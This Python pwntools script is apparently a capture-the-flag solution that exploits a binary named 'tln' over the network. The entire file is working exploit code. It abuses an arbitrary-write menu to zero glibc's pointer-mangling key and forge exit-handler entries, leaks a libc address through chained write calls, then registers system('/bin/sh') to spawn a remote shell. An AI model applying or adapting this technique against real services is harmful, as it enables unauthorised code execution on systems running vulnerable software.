#!/usr/bin/env python3

from pwn import *

libc = ELF("./libc.so.6", checksec=False)

# https://gist.github.com/trietptm/5cd60ed6add5adad6a34098ce255949a
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))


def conn():
    r = remote(args.HOST, args.PORT, ssl=args.SSL)
    if args.TEAM_TOKEN:
        r.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())
    return r


def mangled_ptr(ptr: int, key: int = 0):
    return rol(ptr ^ key, 0x11, 64)


def menu_set_item(offset: int, val: int):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Index: ", str(offset // 8).encode())
    r.sendafter(b"Content: ", p64(val)[:-1])


def menu_exit():
    r.sendlineafter(b"> ", b"3")
    r.recvuntil(b"Bye!\n")


exitfn      = lambda idx: 0x10 + idx * 0x20
exitfn_kind = lambda idx: 0x0 + exitfn(idx)
exitfn_ptr  = lambda idx: 0x8 + exitfn(idx)
exitfn_arg  = lambda idx: 0x10 + exitfn(idx)


def write_exitfn(base: int, idx: int, fn: int, arg: int, kind: int):
    menu_set_item(base + exitfn_kind(idx), kind)
    menu_set_item(base + exitfn_ptr(idx), mangled_ptr(fn))
    menu_set_item(base + exitfn_arg(idx), arg)


def main():
    global r
    r = conn()

    OFF_FS_BASE = 0x800
    OFF_FS_BASE_LIBC = 0x20c0
    EXITFN_BASE = OFF_FS_BASE + OFF_FS_BASE_LIBC + libc.sym['initial']

    menu_set_item(EXITFN_BASE + 0x8, 8) # Exitfn count
    menu_set_item(OFF_FS_BASE + 0x30, 0) # Zero out ptr mangle key

    write_exitfn(EXITFN_BASE, 7, exe.sym['exit'], 1, 4) # Set status to 1 in order to write to stdout
    for i in range(6): # Leak libc ptr byte by byte (rdx = 1)
        write_exitfn(EXITFN_BASE, 6 - i, exe.sym['write'], exe.got['write'] + i, 2)
    write_exitfn(EXITFN_BASE, 0, exe.sym['main'], 0, 3) # Re-enter main

    menu_exit()

    try: 
        libc.address = u64(r.recv(6).ljust(8, b"\x00")) - libc.sym['write']
        assert libc.address & 0xfff == 0
    except AssertionError:
        log.failure("Failed to leak libc address")
        sys.exit(1)

    menu_set_item(EXITFN_BASE + 0x8, 3) # Exitfn count 
    write_exitfn(EXITFN_BASE, 0, libc.sym['system'], next(libc.search(b"/bin/sh\x00")), 4) # shell

    # fix up libc ptr since chall only reads 7 bytes
    
    write_exitfn(EXITFN_BASE, 1, exe.sym['read'], libc.sym['initial'] + exitfn(0) + 8 + 7, 2)
    write_exitfn(EXITFN_BASE, 2, exe.sym['exit'], 0, 4) # set edi = 0

    menu_exit()

    r.send(bytes([p64(mangled_ptr(libc.sym['puts']))[-1]]))

    r.interactive()


if __name__ == "__main__":
    global exe
    exe = ELF("./tln", checksec=False)
    context.binary = exe

    main()
